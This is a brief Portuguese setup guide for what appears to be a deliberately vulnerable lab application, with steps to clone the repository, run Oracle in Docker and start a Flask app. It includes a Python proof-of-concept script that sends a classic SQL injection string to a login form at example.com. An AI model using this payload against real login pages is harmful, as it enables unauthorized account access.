# Clonando o Repositório
git clone https://github.com/usuario/repo-vulneravel.git
cd repo-vulneravel

# Código da PoC
# Exemplo de script Python
import requests

url = "http://example.com/login"
payload = {
    'username': "' OR '1'='1'; --",
    'password': ''
}

response = requests.post(url, data=payload)

if "Welcome" in response.text:
    print("Injeção de SQL bem-sucedida!")
else:
    print("Falha na injeção.")

# Instalação de Dependências
## Para Python
pip install -r requirements.txt

## Para Java
mvn install

# Configurar o Banco de Dados com Docker
## Baixar e Rodar o Oracle Database
docker pull container-registry.oracle.com/database/enterprise:19.3.0.0
docker run -d -it --name oracle-db -p 1521:1521 -e ORACLE_PWD=SenhaForte container-registry.oracle.com/database/enterprise:19.3.0.0

## Acessar o Banco de Dados
sqlplus sys/SenhaForte@localhost:1521/ORCLCDB as sysdba

# Executar a Aplicação Vulnerável
## Para uma aplicação em Flask (Python)
python app.py
